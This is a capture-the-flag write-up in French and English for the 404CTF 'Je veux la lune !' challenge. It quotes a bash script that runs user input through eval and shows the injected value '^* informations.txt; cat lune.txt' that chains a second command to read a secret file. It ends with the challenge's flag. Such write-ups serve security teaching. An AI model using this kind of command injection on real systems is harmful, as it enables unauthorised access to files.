# Binary / Je veux la lune !

## Challenge
Caligula est assis seul devant une table du café. Il y a devant lui 5 tasses vides empilées, et une 6e qu'il sirote lentement, ainsi qu'un ordinateur qu'il regarde fixement. Des cernes profonds creusent son visage. Il lève des yeux étonnamment vifs vers vous alors que vous vous approchez de lui.

Il tend sa main vers son écran d'un air désespéré et s'exclame « Je ne peux plus vivre comme ça, ce monde n'est pas supportable. J'ai besoin de quelque chose de différent. Quelque chose d'impossible, peut-être le bonheur, ou peut-être la lune... Et je sens que ma quête s'approche de sa fin. »

Vous regardez son écran, et voyez qu'il tente d'accéder sans succès à un fichier.

« Vous pensez que je suis fou, mais je n'ai jamais pensé aussi clairement ! » Un calcul rapide vous informe qu'il a probablement consommé plus d'un litre de café, et il n'est que 13h. Vous acquiescez lentement. Il reprend « Regardez, Hélicon m'a enfin rapporté la lune, mais il ne m'a pas donné l'accès... le fourbe. Je brûlerai un quart de sa fortune plus tard pour le punir. Aidez-moi ! »

> Entre peur et pitié, vous décidez de l'aider à obtenir le contenu du fichier secret.

## Inputs
- server at challenges.404ctf.fr:31215
- bash script: [donne_moi_la_lune.sh](./donne_moi_la_lune.sh)


## Solution
Here's the interesting part in the bash script:

```python
echo "Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !

En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?"
read personne
eval "grep -wie ^$personne informations.txt"
```

We need to abuse `grep -wie ^$personne informations.txt` in order to dump `lune.txt`.

Easily done by entering `^* informations.txt; cat lune.txt` for instance, to dump both files and get the flag:

```console
$ nc challenges.404ctf.fr 31215
Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !

En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?
^* informations.txt; cat lune.txt








404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}
Caligula, tu es le PDG de Imperium Romanum Enterprises, tu devrais le savoir...

Caius c'est toi ! Caligula !
(...)
```

## Flag
404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}
